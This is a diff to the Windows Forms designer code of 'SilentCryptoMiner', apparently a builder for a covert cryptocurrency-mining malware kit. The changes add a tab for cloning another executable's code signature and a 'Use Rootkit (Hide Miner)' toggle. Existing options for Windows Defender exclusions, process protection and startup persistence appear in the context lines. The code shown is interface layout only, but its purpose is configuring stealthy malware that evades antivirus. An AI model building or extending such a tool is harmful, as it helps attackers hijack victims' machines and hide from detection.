@@ -86,9 +86,19 @@ namespace SilentCryptoMiner
             this.tabIcon = new System.Windows.Forms.TabPage();
             this.chkIcon = new MephCheckBox();
             this.picIcon = new System.Windows.Forms.PictureBox();
-            this.btnBrowseIcon = new MephButton();
+            this.btnIconBrowse = new MephButton();
             this.txtIconPath = new MephTextBox();
+            this.tabSignature = new System.Windows.Forms.TabPage();
+            this.labelSignatureData = new System.Windows.Forms.Label();
+            this.txtSignatureData = new MephTextBox();
+            this.btnSignatureClone = new MephButton();
+            this.btnSignatureBrowse = new MephButton();
+            this.txtSignaturePath = new MephTextBox();
+            this.chkSignature = new MephCheckBox();
             this.tabOptions = new System.Windows.Forms.TabPage();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.labelOptionRootkit = new System.Windows.Forms.Label();
+            this.toggleRootkit = new MephToggleSwitch();
             this.picAdmin5 = new System.Windows.Forms.PictureBox();
             this.labelOptionProcessProtect = new System.Windows.Forms.Label();
             this.toggleProcessProtect = new MephToggleSwitch();
@@ -121,7 +131,9 @@ namespace SilentCryptoMiner
             this.tabAssembly.SuspendLayout();
             this.tabIcon.SuspendLayout();
             ((System.ComponentModel.ISupportInitialize)(this.picIcon)).BeginInit();
+            this.tabSignature.SuspendLayout();
             this.tabOptions.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.picAdmin5)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.picAdmin2)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.picAdmin3)).BeginInit();
@@ -160,13 +172,16 @@ namespace SilentCryptoMiner
             this.tabcontrolBuilder.Controls.Add(this.tabStartup);
             this.tabcontrolBuilder.Controls.Add(this.tabAssembly);
             this.tabcontrolBuilder.Controls.Add(this.tabIcon);
+            this.tabcontrolBuilder.Controls.Add(this.tabSignature);
             this.tabcontrolBuilder.Controls.Add(this.tabOptions);
             this.tabcontrolBuilder.Controls.Add(this.tabBuild);
             this.tabcontrolBuilder.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
-            this.tabcontrolBuilder.ItemSize = new System.Drawing.Size(32, 85);
+            this.tabcontrolBuilder.ItemSize = new System.Drawing.Size(27, 85);
             this.tabcontrolBuilder.Location = new System.Drawing.Point(13, 65);
+            this.tabcontrolBuilder.Margin = new System.Windows.Forms.Padding(0);
             this.tabcontrolBuilder.Multiline = true;
             this.tabcontrolBuilder.Name = "tabcontrolBuilder";
+            this.tabcontrolBuilder.Padding = new System.Drawing.Point(0, 0);
             this.tabcontrolBuilder.SelectedIndex = 0;
             this.tabcontrolBuilder.Size = new System.Drawing.Size(511, 197);
             this.tabcontrolBuilder.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
@@ -187,6 +202,7 @@ namespace SilentCryptoMiner
             this.tabMain.Controls.Add(this.labelWiki);
             this.tabMain.Controls.Add(this.labelHelp);
             this.tabMain.Location = new System.Drawing.Point(89, 4);
+            this.tabMain.Margin = new System.Windows.Forms.Padding(0);
             this.tabMain.Name = "tabMain";
             this.tabMain.Size = new System.Drawing.Size(418, 189);
             this.tabMain.TabIndex = 0;
@@ -218,11 +234,12 @@ namespace SilentCryptoMiner
             "Swedish",
             "Polish",
             "Spanish",
-            "Russian"});
+            "Russian",
+            "Portuguese (Brazil)"});
             this.comboLanguage.Location = new System.Drawing.Point(83, 158);
             this.comboLanguage.Margin = new System.Windows.Forms.Padding(2);
             this.comboLanguage.Name = "comboLanguage";
-            this.comboLanguage.Size = new System.Drawing.Size(97, 22);
+            this.comboLanguage.Size = new System.Drawing.Size(140, 22);
             this.comboLanguage.StartIndex = 0;
             this.comboLanguage.TabIndex = 50;
             this.comboLanguage.SelectedIndexChanged += new System.EventHandler(this.comboLanguage_SelectedIndexChanged);
@@ -264,7 +281,7 @@ namespace SilentCryptoMiner
             // 
             this.btnMinerRemove.BackColor = System.Drawing.Color.Transparent;
             this.btnMinerRemove.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
-            this.btnMinerRemove.Location = new System.Drawing.Point(173, 109);
+            this.btnMinerRemove.Location = new System.Drawing.Point(173, 101);
             this.btnMinerRemove.Name = "btnMinerRemove";
             this.btnMinerRemove.Size = new System.Drawing.Size(73, 23);
             this.btnMinerRemove.TabIndex = 46;
@@ -275,7 +292,7 @@ namespace SilentCryptoMiner
             // 
             this.btnMinerEdit.BackColor = System.Drawing.Color.Transparent;
             this.btnMinerEdit.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
-            this.btnMinerEdit.Location = new System.Drawing.Point(94, 109);
+            this.btnMinerEdit.Location = new System.Drawing.Point(94, 101);
             this.btnMinerEdit.Name = "btnMinerEdit";
             this.btnMinerEdit.Size = new System.Drawing.Size(73, 23);
             this.btnMinerEdit.TabIndex = 45;
@@ -286,7 +303,7 @@ namespace SilentCryptoMiner
             // 
             this.btnMinerAdd.BackColor = System.Drawing.Color.Transparent;
             this.btnMinerAdd.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
-            this.btnMinerAdd.Location = new System.Drawing.Point(15, 109);
+            this.btnMinerAdd.Location = new System.Drawing.Point(15, 101);
             this.btnMinerAdd.Name = "btnMinerAdd";
             this.btnMinerAdd.Size = new System.Drawing.Size(73, 23);
             this.btnMinerAdd.TabIndex = 44;
@@ -345,6 +362,7 @@ namespace SilentCryptoMiner
             this.tabStartup.Controls.Add(this.labelStartupEntryName);
             this.tabStartup.Controls.Add(this.txtStartupPath);
             this.tabStartup.Location = new System.Drawing.Point(89, 4);
+            this.tabStartup.Margin = new System.Windows.Forms.Padding(0);
             this.tabStartup.Name = "tabStartup";
             this.tabStartup.Size = new System.Drawing.Size(418, 189);
             this.tabStartup.TabIndex = 1;
@@ -560,6 +578,7 @@ namespace SilentCryptoMiner
             this.tabAssembly.Controls.Add(this.txtAssemblyVersion1);
             this.tabAssembly.Controls.Add(this.txtAssemblyTrademark);
             this.tabAssembly.Location = new System.Drawing.Point(89, 4);
+            this.tabAssembly.Margin = new System.Windows.Forms.Padding(0);
             this.tabAssembly.Name = "tabAssembly";
             this.tabAssembly.Size = new System.Drawing.Size(418, 189);
             this.tabAssembly.TabIndex = 2;
@@ -800,9 +819,10 @@ namespace SilentCryptoMiner
             this.tabIcon.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
             this.tabIcon.Controls.Add(this.chkIcon);
             this.tabIcon.Controls.Add(this.picIcon);
-            this.tabIcon.Controls.Add(this.btnBrowseIcon);
+            this.tabIcon.Controls.Add(this.btnIconBrowse);
             this.tabIcon.Controls.Add(this.txtIconPath);
             this.tabIcon.Location = new System.Drawing.Point(89, 4);
+            this.tabIcon.Margin = new System.Windows.Forms.Padding(0);
             this.tabIcon.Name = "tabIcon";
             this.tabIcon.Size = new System.Drawing.Size(418, 189);
             this.tabIcon.TabIndex = 3;
@@ -836,18 +856,18 @@ namespace SilentCryptoMiner
             this.picIcon.TabIndex = 11;
             this.picIcon.TabStop = false;
             // 
-            // btnBrowseIcon
+            // btnIconBrowse
             // 
-            this.btnBrowseIcon.BackColor = System.Drawing.Color.Transparent;
-            this.btnBrowseIcon.Enabled = false;
-            this.btnBrowseIcon.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
-            this.btnBrowseIcon.Location = new System.Drawing.Point(14, 48);
-            this.btnBrowseIcon.Margin = new System.Windows.Forms.Padding(2);
-            this.btnBrowseIcon.Name = "btnBrowseIcon";
-            this.btnBrowseIcon.Size = new System.Drawing.Size(69, 25);
-            this.btnBrowseIcon.TabIndex = 9;
-            this.btnBrowseIcon.Text = "Browse";
-            this.btnBrowseIcon.Click += new System.EventHandler(this.btnBrowseIcon_Click);
+            this.btnIconBrowse.BackColor = System.Drawing.Color.Transparent;
+            this.btnIconBrowse.Enabled = false;
+            this.btnIconBrowse.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
+            this.btnIconBrowse.Location = new System.Drawing.Point(14, 48);
+            this.btnIconBrowse.Margin = new System.Windows.Forms.Padding(2);
+            this.btnIconBrowse.Name = "btnIconBrowse";
+            this.btnIconBrowse.Size = new System.Drawing.Size(69, 25);
+            this.btnIconBrowse.TabIndex = 9;
+            this.btnIconBrowse.Text = "Browse";
+            this.btnIconBrowse.Click += new System.EventHandler(this.btnIconBrowse_Click);
             // 
             // txtIconPath
             // 
@@ -866,9 +886,114 @@ namespace SilentCryptoMiner
             this.txtIconPath.UseSystemPasswordChar = false;
             this.txtIconPath.WordWrap = false;
             // 
+            // tabSignature
+            // 
+            this.tabSignature.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
+            this.tabSignature.Controls.Add(this.labelSignatureData);
+            this.tabSignature.Controls.Add(this.txtSignatureData);
+            this.tabSignature.Controls.Add(this.btnSignatureClone);
+            this.tabSignature.Controls.Add(this.btnSignatureBrowse);
+            this.tabSignature.Controls.Add(this.txtSignaturePath);
+            this.tabSignature.Controls.Add(this.chkSignature);
+            this.tabSignature.Location = new System.Drawing.Point(89, 4);
+            this.tabSignature.Margin = new System.Windows.Forms.Padding(0);
+            this.tabSignature.Name = "tabSignature";
+            this.tabSignature.Size = new System.Drawing.Size(418, 189);
+            this.tabSignature.TabIndex = 6;
+            this.tabSignature.Text = "Signature";
+            // 
+            // labelSignatureData
+            // 
+            this.labelSignatureData.AutoEllipsis = true;
+            this.labelSignatureData.BackColor = System.Drawing.Color.Transparent;
+            this.labelSignatureData.Location = new System.Drawing.Point(11, 83);
+            this.labelSignatureData.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
+            this.labelSignatureData.Name = "labelSignatureData";
+            this.labelSignatureData.Size = new System.Drawing.Size(391, 17);
+            this.labelSignatureData.TabIndex = 27;
+            this.labelSignatureData.Text = "Signature Data (Base64):";
+            // 
+            // txtSignatureData
+            // 
+            this.txtSignatureData.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
+            this.txtSignatureData.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txtSignatureData.ForeColor = System.Drawing.Color.Silver;
+            this.txtSignatureData.Location = new System.Drawing.Point(14, 103);
+            this.txtSignatureData.Margin = new System.Windows.Forms.Padding(2);
+            this.txtSignatureData.MaxLength = 32767;
+            this.txtSignatureData.MultiLine = true;
+            this.txtSignatureData.Name = "txtSignatureData";
+            this.txtSignatureData.ReadOnly = true;
+            this.txtSignatureData.Size = new System.Drawing.Size(388, 74);
+            this.txtSignatureData.TabIndex = 26;
+            this.txtSignatureData.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
+            this.txtSignatureData.UseSystemPasswordChar = false;
+            this.txtSignatureData.WordWrap = false;
+            // 
+            // btnSignatureClone
+            // 
+            this.btnSignatureClone.BackColor = System.Drawing.Color.Transparent;
+            this.btnSignatureClone.Enabled = false;
+            this.btnSignatureClone.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
+            this.btnSignatureClone.Location = new System.Drawing.Point(333, 48);
+            this.btnSignatureClone.Margin = new System.Windows.Forms.Padding(2);
+            this.btnSignatureClone.Name = "btnSignatureClone";
+            this.btnSignatureClone.Size = new System.Drawing.Size(69, 25);
+            this.btnSignatureClone.TabIndex = 25;
+            this.btnSignatureClone.Text = "Clone";
+            this.btnSignatureClone.Click += new System.EventHandler(this.btnSignatureClone_Click);
+            // 
+            // btnSignatureBrowse
+            // 
+            this.btnSignatureBrowse.BackColor = System.Drawing.Color.Transparent;
+            this.btnSignatureBrowse.Enabled = false;
+            this.btnSignatureBrowse.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
+            this.btnSignatureBrowse.Location = new System.Drawing.Point(14, 48);
+            this.btnSignatureBrowse.Margin = new System.Windows.Forms.Padding(2);
+            this.btnSignatureBrowse.Name = "btnSignatureBrowse";
+            this.btnSignatureBrowse.Size = new System.Drawing.Size(69, 25);
+            this.btnSignatureBrowse.TabIndex = 23;
+            this.btnSignatureBrowse.Text = "Browse";
+            this.btnSignatureBrowse.Click += new System.EventHandler(this.btnSignatureBrowse_Click);
+            // 
+            // txtSignaturePath
+            // 
+            this.txtSignaturePath.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
+            this.txtSignaturePath.ForeColor = System.Drawing.Color.Silver;
+            this.txtSignaturePath.Location = new System.Drawing.Point(87, 49);
+            this.txtSignaturePath.Margin = new System.Windows.Forms.Padding(2);
+            this.txtSignaturePath.MaxLength = 32767;
+            this.txtSignaturePath.MultiLine = false;
+            this.txtSignaturePath.Name = "txtSignaturePath";
+            this.txtSignaturePath.ReadOnly = false;
+            this.txtSignaturePath.Size = new System.Drawing.Size(243, 24);
+            this.txtSignaturePath.TabIndex = 24;
+            this.txtSignaturePath.Text = "Path to executable to clone...";
+            this.txtSignaturePath.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
+            this.txtSignaturePath.UseSystemPasswordChar = false;
+            this.txtSignaturePath.WordWrap = false;
+            // 
+            // chkSignature
+            // 
+            this.chkSignature.AccentColor = System.Drawing.Color.ForestGreen;
+            this.chkSignature.BackColor = System.Drawing.Color.Transparent;
+            this.chkSignature.Checked = false;
+            this.chkSignature.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.chkSignature.ForeColor = System.Drawing.Color.Black;
+            this.chkSignature.Location = new System.Drawing.Point(14, 12);
+            this.chkSignature.Margin = new System.Windows.Forms.Padding(2);
+            this.chkSignature.Name = "chkSignature";
+            this.chkSignature.Size = new System.Drawing.Size(111, 24);
+            this.chkSignature.TabIndex = 22;
+            this.chkSignature.Text = "Disabled";
+            this.chkSignature.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkSignature_CheckedChanged);
+            // 
             // tabOptions
             // 
             this.tabOptions.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
+            this.tabOptions.Controls.Add(this.pictureBox1);
+            this.tabOptions.Controls.Add(this.labelOptionRootkit);
+            this.tabOptions.Controls.Add(this.toggleRootkit);
             this.tabOptions.Controls.Add(this.picAdmin5);
             this.tabOptions.Controls.Add(this.labelOptionProcessProtect);
             this.tabOptions.Controls.Add(this.toggleProcessProtect);
@@ -888,10 +1013,44 @@ namespace SilentCryptoMiner
             this.tabOptions.Controls.Add(this.toggleWDExclusions);
             this.tabOptions.Location = new System.Drawing.Point(89, 4);
             this.tabOptions.Name = "tabOptions";
-            this.tabOptions.Padding = new System.Windows.Forms.Padding(3);
             this.tabOptions.Size = new System.Drawing.Size(418, 189);
             this.tabOptions.TabIndex = 5;
             this.tabOptions.Text = "Options";
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
+            this.pictureBox1.Image = global::SilentCryptoMiner.Properties.Resources.microsoft_admin;
+            this.pictureBox1.Location = new System.Drawing.Point(224, 116);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(20, 20);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.pictureBox1.TabIndex = 146;
+            this.pictureBox1.TabStop = false;
+            // 
+            // labelOptionRootkit
+            // 
+            this.labelOptionRootkit.AutoEllipsis = true;
+            this.labelOptionRootkit.BackColor = System.Drawing.Color.Transparent;
+            this.labelOptionRootkit.Font = new System.Drawing.Font("Segoe UI", 9.5F);
+            this.labelOptionRootkit.ForeColor = System.Drawing.Color.Gray;
+            this.labelOptionRootkit.Location = new System.Drawing.Point(10, 118);
+            this.labelOptionRootkit.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
+            this.labelOptionRootkit.Name = "labelOptionRootkit";
+            this.labelOptionRootkit.Size = new System.Drawing.Size(157, 17);
+            this.labelOptionRootkit.TabIndex = 145;
+            this.labelOptionRootkit.Text = "Use Rootkit (Hide Miner):";
+            // 
+            // toggleRootkit
+            // 
+            this.toggleRootkit.BackColor = System.Drawing.Color.Transparent;
+            this.toggleRootkit.Checked = false;
+            this.toggleRootkit.ForeColor = System.Drawing.Color.Black;
+            this.toggleRootkit.Location = new System.Drawing.Point(169, 115);
+            this.toggleRootkit.Margin = new System.Windows.Forms.Padding(2);
+            this.toggleRootkit.Name = "toggleRootkit";
+            this.toggleRootkit.Size = new System.Drawing.Size(50, 24);
+            this.toggleRootkit.TabIndex = 144;
             // 
             // picAdmin5
             // 
@@ -956,7 +1115,7 @@ namespace SilentCryptoMiner
             this.labelOptionWindowsUpdate.AutoEllipsis = true;
             this.labelOptionWindowsUpdate.BackColor = System.Drawing.Color.Transparent;
             this.labelOptionWindowsUpdate.Font = new System.Drawing.Font("Segoe UI", 9.5F);
-            this.labelOptionWindowsUpdate.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.labelOptionWindowsUpdate.ForeColor = System.Drawing.Color.Gray;
             this.labelOptionWindowsUpdate.Location = new System.Drawing.Point(9, 64);
             this.labelOptionWindowsUpdate.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
             this.labelOptionWindowsUpdate.Name = "labelOptionWindowsUpdate";
@@ -1112,6 +1271,7 @@ namespace SilentCryptoMiner
             this.tabBuild.Controls.Add(this.txtLog);
             this.tabBuild.Controls.Add(this.btnBuild);
             this.tabBuild.Location = new System.Drawing.Point(89, 4);
+            this.tabBuild.Margin = new System.Windows.Forms.Padding(0);
             this.tabBuild.Name = "tabBuild";
             this.tabBuild.Size = new System.Drawing.Size(418, 189);
             this.tabBuild.TabIndex = 4;
@@ -1229,7 +1389,9 @@ namespace SilentCryptoMiner
             this.tabAssembly.ResumeLayout(false);
             this.tabIcon.ResumeLayout(false);
             ((System.ComponentModel.ISupportInitialize)(this.picIcon)).EndInit();
+            this.tabSignature.ResumeLayout(false);
             this.tabOptions.ResumeLayout(false);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
             ((System.ComponentModel.ISupportInitialize)(this.picAdmin5)).EndInit();
             ((System.ComponentModel.ISupportInitialize)(this.picAdmin2)).EndInit();
             ((System.ComponentModel.ISupportInitialize)(this.picAdmin3)).EndInit();
@@ -1255,7 +1417,7 @@ namespace SilentCryptoMiner
         internal MephTextBox txtAssemblyProduct;
         internal MephTextBox txtAssemblyTitle;
         internal MephTextBox txtIconPath;
-        internal MephButton btnBrowseIcon;
+        internal MephButton btnIconBrowse;
         internal MephTextBox txtStartupEntryName;
         internal Label labelStartupEntryName;
         internal PictureBox picIcon;
@@ -1315,5 +1477,15 @@ namespace SilentCryptoMiner
         internal PictureBox picAdmin5;
         internal Label labelOptionProcessProtect;
         internal MephToggleSwitch toggleProcessProtect;
+        internal TabPage tabSignature;
+        internal MephTextBox txtSignatureData;
+        internal MephButton btnSignatureClone;
+        internal MephButton btnSignatureBrowse;
+        internal MephTextBox txtSignaturePath;
+        internal MephCheckBox chkSignature;
+        internal Label labelSignatureData;
+        internal PictureBox pictureBox1;
+        internal Label labelOptionRootkit;
+        internal MephToggleSwitch toggleRootkit;
     }
 }
